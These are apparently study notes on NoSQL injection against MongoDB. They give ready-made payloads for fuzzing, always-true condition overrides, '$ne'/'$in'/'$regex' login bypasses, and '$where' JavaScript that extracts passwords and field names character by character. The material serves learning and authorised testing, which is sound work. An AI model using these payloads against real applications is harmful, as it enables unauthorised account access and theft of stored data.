# Resources
- [NoSQL Injection - Popo Hack](https://www.youtube.com/playlist?list=PLzgroH3_jK2gAop1JV_Xc393p1uAtJyAZ)
- [NoSQL Injection - Pink Boo](https://www.youtube.com/playlist?list=PL5lc0RaSiwgI_0ROPufvkeEVBzZJG93fk)
# Extensions and tools
- Content Type Converter extension to automatically convert request methods and change a URL-encoded POST request to JSON
# Types of NoSQL injection
- Syntax injection: The attacker is able to break the NoSQL syntax and inject payloads
- Operator injection: The attacker can use NoSQL query operators to manipulate queries
# NoSQL Syntax Injection
- Attempt to break the query syntax: systematically test each input by submitting fuzz strings and special characters to trigger errors or anomalies
- Start with a single quote '
- Send fuzzing strings to detect syntax injection
- Determine which characters are processed
- Confirm conditional behaviour
- Overriding existing conditions
### MongoDB Example:
https://insecure-website.com/product/lookup?category=fizzy
1. Send a fuzz string depending of the context
```
'"`{
;$Foo}
$Foo \xYZ
```
URL-Encoded
```
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```
As a JSON property
```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```
2. See which characters are interpreted as syntax by injecting individual characters
Injecting `'` to generate error
```
this.category == '''
```
Escaping `'` to see if it doesn't cause an error
```
this.category == '\''
```
3. Try to inject boolean conditions
```
' && 0 && 'x
' && 1 && 'x
```
4. Attempt to override existing conditions
Example: inject a JavaScript condition that always evaluates to true (url-encode)
```
?category=fizzy'||1||'
```
- Warning!: Be careful when injecting conditions that always evaluate to true
    - This data could be used in multiple queries and one of those might result in accidental data deletion
- Example: add a null character at the end. Any  additional conditions on the MongoDB query will be ignored
```
https://insecure-website.com/product/lookup?category=fizzy'%00
```
# NoSQL operator injection
- Query operators allow us to provide way to specify conditions that the data must meet in order to be included in the result.
- To test for NoSQL injection operators: Systematically submit different operators into different user inputs
- MongoDB operators
```
$where - matches documets that satisfy a JavaScript expression
$ne - Matches all values that are not equal to a specified value
$in - Matches all of the values specified in an array
$regex - Selects documents where values match a specified regular expression
```
- Send the query operators in JSON messages
```json
{"username":{"$ne":"invalid"}}
```
- Send the query operators in the URL
```
username[$ne]=invalid
```
- If the query operators cannot be sent in the URL:
    - Change the request from GET to POST
    - Change the Content-Type to application/json
    - Add the JSON message with the query operator
- The Content Type Converter extension could be used to simplify this process
- Sample injections
```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
{"username":{"$regex":"regex-here"},"password":{"$ne":""}}
```
# Exploiting syntax injection to extract data
- MongoDB
- Detect if the $where operator or the mapReduc() functions are being used and limited JavaScript could be run
- Imagine an scenario where the user input ends up in the following query
```json
{"$where":"this.username == 'admin'"}
```
- Inject payloads such as the ones shown below
```js
' && this.password[0] == 'a' || 'a'=='b
' && this.password.match(/\d/) || 'a'=='b
' && this.password.length=='1
' && this.password[0]=='a
' && this.password.match("^.{0}a.*$")%00
```
- Identify field names
- Send requests probing for field names
```
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'

The url-decoded payload is

admin' && this.password!='
```
- Send payloads with fields that are known to exists and fields that do not exist `this.asafsafsfs!='`
# Exploiting NoSQL operator injection to extract data
- If the original query does not use one of the operators that enable arbitrary JavaScript, you could try to inject the operator yourself
- Use boolean conditions to determine if you can execute JavaScript
- Example
- Consider the following
```
{"username":"wiener","password":"peter"}
```
- Inject NoSQL to include boolean conditions. See if there is an indication that the operator is being evaluated and has an effect
```
{"username":"wiener","password":"peter", "$where":"0"}
{"username":"wiener","password":"peter", "$where":"1"}
```
- Extracting the field names might be required. They keys() method could be used, an example payload is shown below:
```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```
- Extract field's value
```
"$where":"this.fieldName.match('^.{0}a.*')"
```
- The $regex operator might also be used to extract data
```
{"username":"admin","password":{"$regex":"^.*"}}
```
